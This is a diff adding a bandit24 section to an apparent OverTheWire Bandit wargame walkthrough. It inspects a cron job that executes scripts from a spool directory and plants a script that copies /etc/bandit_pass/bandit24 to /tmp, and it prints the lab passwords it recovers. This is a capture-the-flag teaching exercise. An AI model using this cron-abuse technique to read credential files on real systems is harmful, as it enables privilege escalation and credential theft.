@@ -406,3 +406,53 @@ $ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
 $ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
 ```
+
+## bandit24
+Find the cronjob running for bandit24.
+```bash
+$ ls -l /etc/cron.d
+total 24
+-rw-r--r-- 1 root root  62 May 14  2020 cronjob_bandit15_root
+-rw-r--r-- 1 root root  62 Jul 11  2020 cronjob_bandit17_root
+-rw-r--r-- 1 root root 120 May  7  2020 cronjob_bandit22
+-rw-r--r-- 1 root root 122 May  7  2020 cronjob_bandit23
+-rw-r--r-- 1 root root 120 May 14  2020 cronjob_bandit24
+-rw-r--r-- 1 root root  62 May 14  2020 cronjob_bandit25_root
+
+$ cat /etc/cron.d/cronjob_bandit24
+@reboot bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
+* * * * * bandit24 /usr/bin/cronjob_bandit24.sh  &> /dev/null
+
+$ cat /usr/bin/cronjob_bandit24.sh
+#!/bin/bash
+
+myname=$(whoami)
+
+cd /var/spool/$myname
+echo "Executing and deleting all scripts in /var/spool/$myname:"
+for i in * .*;
+do
+    if [ "$i" != "." -a "$i" != ".." ];
+    then
+        echo "Handling $i"
+        owner="$(stat --format "%U" ./$i)"
+        if [ "${owner}" = "bandit23" ]; then
+            timeout -s 9 60 ./$i
+        fi
+        rm -f ./$i
+    fi
+done
+```
+If executed by bandit24, this bash script `cd`s to `/var/spool/bandit24` and executes all scripts owned by bandit23 inside using `timeout`. The easiest way to get the password is to `cat` it out to a file in `/tmp`.
+
+```bash
+# /var/spool/bandit24/script.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/bazinga/password.txt
+```
+Now, read the new file.
+
+```bash
+$ cat /tmp/bazinga/password.txt
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+```
